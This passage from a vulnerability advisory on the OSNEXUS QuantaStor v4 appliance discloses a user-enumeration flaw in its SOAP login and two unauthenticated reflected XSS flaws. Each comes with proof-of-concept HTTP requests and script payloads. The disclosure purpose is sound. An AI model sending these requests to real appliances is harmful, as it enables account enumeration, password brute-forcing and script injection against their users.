3. --- Vulnerability Description ---

    OSNEXUS QuantaStor [1] Software Define Storage appliance was designed to ease the process of storage management.
    From vendor's website "...QuantaStor SDS, deployed in datacenters worldwide, addresses a broad set of storage use
    cases including server virtualization, big data, cloud computing, and high performance applications
    through scale-out physical and virtual storage appliances..."

    Three different vulnerabilities were found in the appliance. A user enumeration attack and two unauthenticated XSS.
    These vulnerabilities could allow a remote attacker to obtain valid usernames to perform bruteforce attacks and
    obtain sensitive information.


4. --- Affected software versions ---

              OSNEXUS QuantaStor v4 virtual appliance

5. --- Technical description ---

    5.1 --- User enumeration ---

        QuantaStor login mechanism returns different messages if the account used to perform the login is valid or not in the system.
        Leveraging this difference an attacker could be able to enumerate valid accounts.

    5.1.1 --- Proof of Concept ---

        Executing the following HTTP requests an attacker can perform a login request.

        """

        POST / HTTP/1.0
        Content-Type: text/xml; charset=utf-8
        Accept: application/soap+xml, application/dime, multipart/related, text/*
        User-Agent: Axis/1.4
        Host: localhost:5152
        Cache-Control: no-cache
        Pragma: no-cache
        SOAPAction: ""
        Authorization: Basic <REPLACE WITH BASE64 Encoded credentials>
        Content-Length: 384


        <?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
        <soapenv:Body>
        <objectGet xmlns="http://quantastor.osnexus.com/webservices/osn.xsd"><reserved xmlns="">
        </reserved></auditLogGet></soapenv:Body></soapenv:Envelope>

        """

        If the user included in the request is valid, the error returned by the application will be:

            <SOAP-ENV:Body><SOAP-ENV:Fault><faultcode>SOAP-ENV:Server</faultcode><faultstring><fault>Authentication check failed for 'admin',
            please verify your password was entered correctly. (10.10.0.1) [err=26]
            </fault></faultstring><detail><detail><msg>Authentication check failed for 'admin', please verify your password was entered correctly. (10.10.0.1)
            [err=26]</msg><loc>service/osn_security_manager.cpp:1298</loc></detail></detail></SOAP-ENV:Fault></SOAP-ENV:Body></SOAP-ENV:Envelope>

        But if the user doesn't exist in the system, the message will be:

            <SOAP-ENV:Body><SOAP-ENV:Fault><faultcode>SOAP-ENV:Server</faultcode><faultstring><fault>Authentication failed, please
            verify your username, 'TESTUSER' is invalid. (10.10.0.1) [err=26]</fault></faultstring><detail><detail><msg>
            Authentication failed, please verify your username, 'TESTUSER' is invalid. (10.10.0.1) [err=26]
            </msg><loc>service/osn_security_manager.cpp:1256</loc></detail></detail></SOAP-ENV:Fault></SOAP-ENV:Body></SOAP-ENV:Envelope>

    5.2 --- Cross Site Scripting in "qsCall" parameter

        QuantaStor API accepts parameters through the use of the "qsCall" parameter. If the method called
        doesn't exist an error will be triggered containing the invalid method previously invoked.
        The response sent to the user isn't sanitized.
        An attacker can leverage this issue including arbitrary HTML or JavaScript code in the qsCall parameter.

    5.2.2 --- Proof of Concept ---

        Execute the following HTTP request.

        """
        https://<HOST>:8153/qstorapi?qsCall=%3Cscript%3Ealert(1)%3C/script%3E
        """

    5.3 --- Cross Site Scripting in "/qstorapi/jsonrpc"

        QuantaStor "jsonrpc "API accepts parameters through the use of a JSON dictionary. If the method called
        doesn't exist an error will be triggered containing the invalid method previously invoked.
        The response sent to the user isn't sanitized.
        An attacker can leverage this issue including arbitrary HTML or JavaScript code in the "method" key.

    5.3.1 --- Proof of Concept ---

        Execute the following HTTP request.

        """
        POST /qstorapi/jsonrpc HTTP/1.0

        Accept: application/soap+xml, application/dime, multipart/related, text/*
        User-Agent: Axis/1.4
        Host: <HOST>:8153
        Cache-Control: no-cache
        Pragma: no-cache
        Content-Type: application/json
        Content-Length: 54


        {"method":"<script>alert(1)</script>", "params":"asd"}
        """
